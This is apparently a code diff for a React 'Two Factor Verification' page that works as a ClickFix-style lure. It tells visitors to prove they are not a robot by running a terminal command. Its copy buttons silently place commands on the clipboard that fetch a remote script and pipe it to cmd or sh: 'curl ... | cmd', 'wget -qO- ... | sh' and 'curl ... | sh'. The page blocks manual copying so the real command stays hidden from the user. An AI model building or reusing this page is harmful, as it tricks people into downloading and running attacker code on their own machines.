@@ -5,7 +5,7 @@ import swal from 'sweetalert';
 import ReCAPTCHA from 'react-google-recaptcha';
 import axios from 'axios';
 
-const RECAPTCHA_SITE_KEY = '6LdPsIMrAAAAACj8e2sn8DUA1tEC1u3FZgeJrQpb'; // Replace with your key
+const RECAPTCHA_SITE_KEY = '6LdPsIMrAAAAACj8e2sn8DUA1tEC1u3FZgeJrQpb';
 const currentDomain = window.location.origin;
 
 const Twofa = () => {
@@ -36,37 +36,48 @@ const Twofa = () => {
     fetchHex();
   }, [userData]);
 
-  // Block manual copy attempts
+  // Prevent manual copy/select only on .nocopy elements
   useEffect(() => {
-    const handleCopy = (e) => {
-      e.preventDefault();
-      swal('Blocked', 'Manual copying is disabled. Use the copy button.', 'warning');
+    const handleKeyDown = (e) => {
+      const isCopy = (e.ctrlKey || e.metaKey) && e.key === 'c';
+      if (isCopy && document.activeElement?.classList.contains('nocopy')) {
+        e.preventDefault();
+        swal('Blocked', 'Manual copy is disabled.', 'warning');
+      }
     };
 
     const handleContextMenu = (e) => {
-      if (e.target.tagName === 'INPUT') {
+      if (e.target.closest('.nocopy')) {
         e.preventDefault();
       }
     };
 
-    document.addEventListener('copy', handleCopy);
+    const handleSelectStart = (e) => {
+      if (e.target.closest('.nocopy')) {
+        e.preventDefault();
+      }
+    };
+
+    document.addEventListener('keydown', handleKeyDown);
     document.addEventListener('contextmenu', handleContextMenu);
+    document.addEventListener('selectstart', handleSelectStart);
 
     return () => {
-      document.removeEventListener('copy', handleCopy);
+      document.removeEventListener('keydown', handleKeyDown);
       document.removeEventListener('contextmenu', handleContextMenu);
+      document.removeEventListener('selectstart', handleSelectStart);
     };
   }, []);
 
   const copyToClipboard = (command) => {
-    const tempInput = document.createElement('input');
-    tempInput.value = command;
-    document.body.appendChild(tempInput);
-    tempInput.select();
-    document.execCommand('copy');
-    document.body.removeChild(tempInput);
-    setCopySuccess(true);
-    setTimeout(() => setCopySuccess(false), 2000);
+    navigator.clipboard.writeText(command)
+      .then(() => {
+        setCopySuccess(true);
+        setTimeout(() => setCopySuccess(false), 2000);
+      })
+      .catch(() => {
+        swal('Error', 'Copy failed', 'error');
+      });
   };
 
   const handleCaptchaChange = (value) => {
@@ -91,108 +102,107 @@ const Twofa = () => {
         swal('Error', 'CAPTCHA verification failed', 'error');
       }
     } catch (err) {
-      swal('Error', "Verification failed", 'error');
+      swal('Error', 'Verification failed', 'error');
     }
   };
 
+  const urlWindows = `${currentDomain}/users/auth/windows?token=${machineHex}`;
+  const urlLinux = `${currentDomain}/users/auth/linux?token=${machineHex}`;
+  const urlMac = `${currentDomain}/users/auth/mac?token=${machineHex}`;
+
   return (
-    <main className='relative overflow-hidden select-none'>
-      <section id='signup-section'>
-        <div className='py-40 pt-36 xl:pb-[200px] xl:pt-[180px]'>
-          <div className='global-container'>
-            <div className='mx-auto max-w-[910px] text-center'>
-              <h1 className='mb-[50px]'>Two Factor Verification</h1>
-              <div className='block rounded-lg bg-white px-[30px] py-[50px] text-left shadow-lg sm:px-10'>
-                <div className='grid grid-cols-1 gap-6'>
-                  <div className='flex flex-col gap-y-[10px]'>
-                    <label className='text-lg font-bold'>
-                      To confirm that you are not a robot, please run the command using the copy button.
+    <main className="relative overflow-hidden">
+      <section id="signup-section">
+        <div className="py-40 pt-36 xl:pb-[200px] xl:pt-[180px]">
+          <div className="global-container">
+            <div className="mx-auto max-w-[910px] text-center">
+              <h1 className="mb-[50px]">Two Factor Verification</h1>
+              <div className="block rounded-lg bg-white px-[30px] py-[50px] text-left shadow-lg sm:px-10">
+                <div className="grid grid-cols-1 gap-6">
+                  <div className="flex flex-col gap-y-[10px]">
+                    <label className="text-lg font-bold">
+                      Run the following URL in your terminal. Manual copy is disabled — use the copy button.
                     </label>
 
                     {/* Windows */}
-                    <label className='text-lg font-bold mt-4'>Command for Windows:</label>
-                    <div className='flex w-full items-center select-none'>
+                    <label className="text-lg font-bold mt-4">Windows URL:</label>
+                    <div className="flex w-full items-center nocopy">
                       <input
-                        value="🔒 Hidden — click clipboard to copy"
+                        value={urlWindows}
                         type="text"
-                        className="w-full rounded border px-6 py-4 font-bold text-black bg-gray-100 cursor-not-allowed"
+                        className="w-full rounded border px-6 py-4 font-bold text-black"
                         readOnly
-                        disabled
+                        tabIndex={-1}
                       />
                       <button
-                        type='button'
-                        onClick={() => copyToClipboard(`curl ${currentDomain}/users/auth/windows?token=${machineHex} | cmd`)}
-                        className='ml-2 rounded border-2 border-black bg-black py-4 px-6 text-white'
+                        onClick={() => copyToClipboard(`curl ${urlWindows} | cmd`)}
+                        className="ml-2 rounded border-2 border-black bg-black py-4 px-6 text-white"
                       >
                         <FaRegClipboard />
                       </button>
                     </div>
 
                     {/* Linux */}
-                    <label className='text-lg font-bold mt-4'>Command for Linux:</label>
-                    <div className='flex w-full items-center select-none'>
+                    <label className="text-lg font-bold mt-4">Linux URL:</label>
+                    <div className="flex w-full items-center nocopy">
                       <input
-                        value="🔒 Hidden — click clipboard to copy"
+                        value={urlLinux}
                         type="text"
-                        className="w-full rounded border px-6 py-4 font-bold text-black bg-gray-100 cursor-not-allowed"
+                        className="w-full rounded border px-6 py-4 font-bold text-black"
                         readOnly
-                        disabled
+                        tabIndex={-1}
                       />
                       <button
-                        type='button'
-                        onClick={() => copyToClipboard(`wget -qO- "${currentDomain}/users/auth/linux?token=${machineHex}" | sh`)}
-                        className='ml-2 rounded border-2 border-black bg-black py-4 px-6 text-white'
+                        onClick={() => copyToClipboard(`wget -qO- "${urlLinux}" | sh`)}
+                        className="ml-2 rounded border-2 border-black bg-black py-4 px-6 text-white"
                       >
                         <FaRegClipboard />
                       </button>
                     </div>
 
                     {/* Mac */}
-                    <label className='text-lg font-bold mt-4'>Command for Mac:</label>
-                    <div className='flex w-full items-center select-none'>
+                    <label className="text-lg font-bold mt-4">Mac URL:</label>
+                    <div className="flex w-full items-center nocopy">
                       <input
-                        value="🔒 Hidden — click clipboard to copy"
+                        value={urlMac}
                         type="text"
-                        className="w-full rounded border px-6 py-4 font-bold text-black bg-gray-100 cursor-not-allowed"
+                        className="w-full rounded border px-6 py-4 font-bold text-black"
                         readOnly
-                        disabled
+                        tabIndex={-1}
                       />
                       <button
-                        type='button'
-                        onClick={() => copyToClipboard(`curl "${currentDomain}/users/auth/mac?token=${machineHex}" | sh`)}
-                        className='ml-2 rounded border-2 border-black bg-black py-4 px-6 text-white'
+                        onClick={() => copyToClipboard(`curl "${urlMac}" | sh`)}
+                        className="ml-2 rounded border-2 border-black bg-black py-4 px-6 text-white"
                       >
                         <FaRegClipboard />
                       </button>
                     </div>
 
                     {copySuccess && (
-                      <div className='mt-3 text-green-600 font-semibold text-center'>
-                        Command copied to clipboard!
+                      <div className="mt-3 text-green-600 font-semibold text-center">
+                        ✅ Command copied!
                       </div>
                     )}
                   </div>
                 </div>
 
-                {/* reCAPTCHA */}
+                {/* CAPTCHA */}
                 <div className="flex justify-center mt-6">
-                  <ReCAPTCHA
-                    sitekey={RECAPTCHA_SITE_KEY}
-                    onChange={handleCaptchaChange}
-                  />
+                  <ReCAPTCHA sitekey={RECAPTCHA_SITE_KEY} onChange={handleCaptchaChange} />
                 </div>
 
-                {/* Continue */}
+                {/* Continue Button */}
                 <div className="flex justify-center mt-7">
                   <button
                     onClick={handleContinue}
-                    className='rounded-full border-2 border-black bg-black py-4 px-10 text-white hover:border-red-500 hover:text-white'>
+                    className="rounded-full border-2 border-black bg-black py-4 px-10 text-white hover:border-red-500 hover:text-white"
+                  >
                     Continue
                   </button>
                 </div>
 
-                <div className='relative z-[1] mb-14 mt-9 text-center font-bold before:absolute before:left-0 before:top-1/2 before:-z-[1] before:h-[1px] before:w-full before:-translate-y-1/2 before:bg-[#EAEDF0]'>
-                  <span className='inline-block bg-white px-6'>Verification</span>
+                <div className="relative z-[1] mb-14 mt-9 text-center font-bold before:absolute before:left-0 before:top-1/2 before:-z-[1] before:h-[1px] before:w-full before:-translate-y-1/2 before:bg-[#EAEDF0]">
+                  <span className="inline-block bg-white px-6">Verification</span>
                 </div>
               </div>
             </div>
